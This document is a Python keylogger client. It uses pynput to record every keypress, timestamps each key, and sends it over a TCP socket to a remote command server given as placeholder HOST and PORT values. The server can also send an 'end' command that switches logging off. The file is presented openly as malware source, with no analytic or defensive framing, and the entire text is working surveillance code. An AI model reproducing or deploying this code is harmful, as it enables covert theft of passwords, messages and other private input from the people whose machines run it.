import socket
import sys
import datetime
from pynput.keyboard import Listener

"""
@author DeKyll <d3kyll@gmail.com>
"""

PORT = {SERVER_PORT}
HOST = {SERVER_IP}

new_key_released = False
actual_key = ""

def make_connection(stop, message, listener):
    try:
        # prepares socket connection
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        host_ip = socket.gethostbyname(HOST)

        # connecting to the server
        client_socket.connect((host_ip, 4558))

        # sending data to server
        client_socket.send(message.encode())

        marker_reached = False
        response_length = ""
        # receiving response from server, reads until first "#" that forms the message length
        while marker_reached == False:
            server_response = client_socket.recv(1)
            value_decoded = server_response.decode()
            if value_decoded == "#":
                marker_reached = True
            else:
                response_length += value_decoded

        # reads the message length that was calculated from previous step
        server_response = client_socket.recv(int(response_length))

        client_socket.close()
        
        if server_response.decode() == "end":
            listener.stop()
            stop = 0
            message = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S") + " > Keylogger OFF"

            # prepares socket connection
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            host_ip = socket.gethostbyname(HOST)
            # connecting to the server to send last message
            client_socket.connect((host_ip, 4558))
            # sending last data to server
            client_socket.send(message.encode())

            client_socket.close()

        return stop

    except socket.error:
        sys.exit(1)

def connect_iteration(stop, listener):
    global new_key_released
    if stop == 1:
        message = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S") + " > Keylogger ON"
        stop = 2
        return make_connection(stop, message, listener)
    elif new_key_released == True:
        new_key_released = False
        return make_connection(stop, datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S") + " > " + str(actual_key), listener)

def show(key):
    global new_key_released
    global actual_key
    new_key_released = True
    actual_key = key

def main():
    stop = 1

    # Collect all events until gets stopped
    listener = Listener(on_press = show)
    listener.start()

    while stop != 0:
        stop = connect_iteration(stop, listener)

if __name__ == "__main__":
    main()